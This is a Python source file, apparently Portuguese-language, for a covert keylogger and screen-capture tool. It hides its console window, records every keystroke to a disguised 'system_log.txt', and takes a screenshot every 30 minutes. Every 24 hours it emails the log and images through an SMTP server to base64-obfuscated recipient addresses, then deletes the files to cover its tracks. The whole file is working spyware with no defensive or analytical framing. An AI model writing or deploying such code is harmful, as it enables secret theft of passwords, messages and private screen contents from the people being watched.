import os
import sys
import logging
import smtplib
import base64
import threading
import time
from email.mime.image import MIMEImage

import pyautogui
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard

#  Hide the console window
if sys.platform == "win32":
    import ctypes

    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

#  Log file path
log_file = os.path.expanduser("~") + "/system_log.txt"
screenshot_folder = os.path.expanduser("~") + "/screenshots/"

#  Logger configuration
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")


# func to hook the keys
def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")


def take_screenshot():
    while True:
        screenshot_path = os.path.join(screenshot_folder, f"screenshot_{int(time.time())}.png")
        pyautogui.screenshot(screenshot_path)
        time.sleep(1800)    # <-- 30 minutes 


# send the log email

def send_email():
    email_temp = "exemplo@sharklasers.com"   # TODO: Change the email randomly after 24h
    api_url = "https://api.guerrillamail.com/ajax.php"
    response = requests.post(api_url)
    print(response.text)

    sender = '060d69ba15d861'
    receiver = 'oC0rvo@proton.me'
    sender_pass = base64.b64decode('Y2VhYWUxMWIzYTQxZWU=').decode('utf-8')

    with open(log_file, "r") as file:
        log_content = file.read()

    if log_content.strip():     # Only send the email if the log is not empty
        msg = MIMEMultipart()
        msg["From"] = email_temp
        msg["To"] = base64.b64decode('bHVjYXNjYmwyMDAzQGdtYWlsLmNvbQ==').decode('utf-8')    # <-- change this
        msg["Subject"] = "Registro de teclas capturado"

        msg.attach(MIMEText(log_content, "plain"))

        for img in os.listdir(screenshot_folder):
            with open(screenshot_folder + img,"rb") as file:
                image = MIMEImage(file.read())
                image.add_header('content-Disposition',f'attachment; filename={img}')
                msg.attach(image)

        try:
            server = smtplib.SMTP("sandbox.smtp.mailtrap.io", 2525)     # <-- change this
            server.ehlo()
            server.starttls()
            server.login(sender, sender_pass)
            server.sendmail(email_temp, receiver, msg.as_string())
            server.quit()
            print("E-mail enviado com sucesso!")
        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")

#  24h Loop that
def schedule_email():
    while True:
        time.sleep(86400)  #  24h = 86400 secs
        send_email()
        os.remove(log_file)  # Delete the  log file
        for img in os.listdir(screenshot_folder):   # Delete the image file
            os.remove(screenshot_folder + img)

        logging.basicConfig(filename=log_file, level=logging.DEBUG,
                            format="%(asctime)s - %(message)s")  # Start a new log file

# start to take screenshots
threading.Thread(target=take_screenshot, daemon=True).start()
#  Start the keylogger
email_thread = threading.Thread(target=schedule_email, daemon=True)
email_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


